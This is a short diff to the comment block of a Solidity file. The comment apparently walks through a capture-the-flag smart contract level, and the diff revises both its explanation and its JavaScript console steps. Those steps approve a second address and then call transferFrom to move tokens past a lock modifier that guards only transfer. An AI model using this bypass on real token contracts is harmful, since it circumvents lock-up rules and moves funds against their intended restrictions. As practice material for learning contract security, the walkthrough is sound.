@@ -7,15 +7,16 @@ pragma solidity ^0.8.20;
  */
 
 /*
-The modifier in charge of locking the tokens is poorly implemented. 
+Non custom implementation of the `transferFrom` function enforcing the
+`lockTokens` modifier.
 Let's take advantage of it to transfer the tokens to another address.
 
  1. Approve another address to transfer tokens on your behalf
-const balance = "1000000000000000000000000";
+const balance = await contract.balanceOf(player);
 await contract.approve("TheFutureCoinOwner", balance);
 
  2. Transfer the tokens to another address using the transferFrom function
-await contract.transferFrom("YourAddressHere", "TheFutureCoinOwner", balance);
+await contract.transferFrom(player, "TheFutureCoinOwner", balance);
 
 
 🎉 Level completed! 🎉
